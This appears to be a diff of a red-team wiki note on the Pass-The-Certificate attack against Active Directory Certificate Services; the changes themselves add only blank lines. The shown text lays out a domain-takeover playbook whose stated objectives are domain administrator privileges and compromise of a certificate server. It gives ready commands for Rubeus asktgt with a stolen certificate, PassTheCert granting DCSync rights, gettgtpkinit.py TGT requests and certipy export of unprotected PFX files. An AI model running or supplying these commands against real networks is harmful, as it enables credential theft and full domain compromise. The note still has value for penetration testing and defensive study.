@@ -45,9 +45,13 @@ From a technical perspective, the attack involves stealing a certificate from an
 
 The business value of this attack is that it allows an attacker to gain full control over an organization's Active Directory environment, which can be used to steal sensitive data, install backdoors, and carry out other malicious activities.
 
+ 
+
 ## Requirements
 
 1. Access to an Active Directory Certificate Services server
+
+ 
 
 ## Defense
 
@@ -57,20 +61,32 @@ The business value of this attack is that it allows an attacker to gain full con
 
 1. Implement multi-factor authentication to prevent unauthorized access to the AD CS server
 
+ 
+
 ## Objectives
 
 1. Obtain domain administrator privileges
 
 1. Compromise an Active Directory Certificate Services server
 
+ 
+
 # Instructions
 
 1. Use the following commands to manage certificates:
 
+ 
+
+
+
 **Code**: [[# Information about a cert file
 certutil -v -dump ]]
 
+
+
 > The first command is used to get information about a certificate file. The second command is used to ask for a TGT ticket using a certificate. The third command is used to grant DCSync rights to a user. The last command is used to restore the previous state of the system after running the third command.
+
+
 
 **Command** ([[certutil dump]]):
 
@@ -78,11 +94,19 @@ certutil -v -dump ]]
 certutil -v -dump admin.pfx
 ```
 
+
+
+
+
 **Command** ([[Rubeus asktgt]]):
 
 ```bash
 Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
 ```
+
+
+
+
 
 **Command** ([[PassTheCert grant DCSync]]):
 
@@ -90,15 +114,27 @@ Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIF
 ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
 ```
 
+
+
+
+
 **Command** ([[PassTheCert restore]]):
 
 ```bash
 ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
 ```
 
+
+
 2. The gettgtpkinit.py command can be used to obtain a Ticket Granting Ticket (TGT) using PKINIT. There are multiple ways to provide the required certificate and private key information. These are:
 
+ 
+
+
+
 **Code**: [[# Base64-encoded PFX certificate (string) (passwor]]
+
+
 
 > - Base64-encoded PFX certificate (string) (password can be set)
   - Use the -pfx-base64 option followed by the base64-encoded certificate string and provide the FQDN domain name and target SAM account name along with the path to the TGT ccache file.
@@ -112,11 +148,17 @@ Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIF
 - Using Certipy
   - Use the certipy auth command followed by the -pfx option and the path to the PFX certificate file. Provide the domain controller IP, username and domain name. Then use the certipy cert command followed by the -export and -pfx options along with the path to the PFX certificate file and the password if the certificate is password-protected. The exported certificate will be saved in the specified path.
 
+
+
 **Command** ([[Get TGT using Base64-encoded PFX certificate]]):
 
 ```bash
 gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
 ```
+
+
+
+
 
 **Command** ([[Get TGT using PEM certificate and private key]]):
 
@@ -124,17 +166,27 @@ gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SA
 gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
 ```
 
+
+
+
+
 **Command** ([[Get TGT using PFX certificate and password]]):
 
 ```bash
 gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
 ```
 
+
+
+
+
 **Command** ([[Export unprotected PFX certificate using Certipy]]):
 
 ```bash
 certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -166,3 +218,5 @@ certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unp
 - [[Active Directory Attacks]]
 - [[Active Directory Certificate Services]]
 - [[Pass-The-Certificate]]
+
+
